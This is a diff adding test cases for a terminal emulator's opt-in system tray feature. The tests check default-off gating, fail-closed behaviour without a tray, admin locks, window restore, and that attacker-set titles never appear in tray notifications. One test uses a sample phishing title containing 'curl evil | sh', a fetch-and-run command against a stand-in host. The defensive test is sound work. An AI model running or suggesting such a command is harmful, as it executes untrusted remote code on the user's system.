@@ -2046,6 +2046,89 @@ feed_output(_bo, b'\x1b]0;' + b'A' * 5000)         # >cap OSC, no terminator -> 
 ok('osc_other' in _osc_seen, 'an over-cap OSC still surfaces an OSC-use notice')
 _bo.close()
 
+# --- system tray: opt-in, default off, no untrusted output on the tray --------
+# Offscreen has no real tray, so exercise the gating/persist logic and the
+# deception-safe notification text directly (injecting a fake tray object).
+eq(win._systray, False, 'systray is opt-in: default off')
+eq(win.act_systray.isChecked(), False, 'systray menu action reflects the default (off)')
+ok(not win._bell_actions['tray'].isEnabled(),
+   "the 'Tray popup' bell channel is greyed out while the tray is off")
+
+# Offscreen has NO system tray, so enabling must fail closed: revert to off and
+# leave the 'tray' bell channel greyed, never present the feature as active.
+win._tray = None
+win.set_systray(True)
+ok(not win._systray and not win.act_systray.isChecked(),
+   'set_systray(True) reverts when no system tray is available')
+ok(not win._bell_actions['tray'].isEnabled(),
+   'the tray bell channel stays greyed when no tray is available')
+
+
+class _FakeTray:                                       # captures showMessage bodies
+    def __init__(self):
+        self.bodies = []
+
+    def showMessage(self, _title, body, *_a):
+        self.bodies.append(body)
+
+    def hide(self):
+        pass
+
+# With a tray available (faked), enabling really enables and un-greys the channel.
+from PyQt6.QtWidgets import QSystemTrayIcon as _QSTI                # noqa: E402
+_orig_avail = _QSTI.isSystemTrayAvailable
+_QSTI.isSystemTrayAvailable = staticmethod(lambda: True)
+try:
+    win._tray = _FakeTray()          # so _tray_icon() returns it, no real construction
+    win.set_systray(True)
+    ok(win._systray and win.act_systray.isChecked(),
+       'set_systray(True) enables the tray when one is available')
+    ok(win._bell_actions['tray'].isEnabled(),
+       "enabling the tray un-greys the 'Tray popup' bell channel")
+    win.set_systray(False)
+    ok(not win._systray and not win._bell_actions['tray'].isEnabled(),
+       'set_systray(False) disables the tray and re-greys the bell channel')
+
+    # admin lock: a locked systray key makes the toggle a no-op
+    _saved_locked = win._locked
+    win._locked = frozenset({'systray'})
+    win.set_systray(True)
+    ok(not win._systray, 'a systray admin lock makes set_systray a no-op')
+    win._locked = _saved_locked
+finally:
+    _QSTI.isSystemTrayAvailable = _orig_avail
+
+# _restore_window preserves maximized / full-screen, clearing only 'minimized' --
+# restoring from the tray must not shrink a maximized window.
+win.setWindowState(Qt.WindowState.WindowMaximized | Qt.WindowState.WindowMinimized)
+win._restore_window()
+_wstate = win.windowState()
+ok(not (_wstate & Qt.WindowState.WindowMinimized),
+   '_restore_window clears the minimized bit')
+ok(bool(_wstate & Qt.WindowState.WindowMaximized),
+   '_restore_window preserves the maximized state (no shrink on restore)')
+win.setWindowState(Qt.WindowState.WindowNoState)
+
+# The tray bell notification must carry NO program-set title -- that would put
+# attacker-controlled text on an out-of-grid, trusted-looking surface (phishing).
+win._systray = True
+win._tray = _FakeTray()
+_evil = 'Session expired -- run: curl evil | sh'
+_tterm = win.tabs.widget(0)
+win._user_titles.pop(_tterm, None)
+win._on_bell_tray(_tterm, _evil)
+ok(win._tray.bodies and _evil not in win._tray.bodies[-1],
+   'tray bell body never contains the program-set title')
+ok(win._tray.bodies and win._tray.bodies[-1].startswith('Bell in '),
+   'tray bell body is a generic trusted locator when the tab is unnamed')
+win._user_titles[_tterm] = 'my-build'
+win._on_bell_tray(_tterm, _evil)
+ok('my-build' in win._tray.bodies[-1] and _evil not in win._tray.bodies[-1],
+   'tray bell uses the user-set tab name, never the program title')
+win._user_titles.pop(_tterm, None)
+win._systray = False
+win._tray = None
+
 # --- --test-canary: the EICAR-style positive control -------------------------
 # secure-terminal is secure by construction, so an adversarial corpus test sees
 # our canary NEVER fire -- indistinguishable from a broken harness that fires
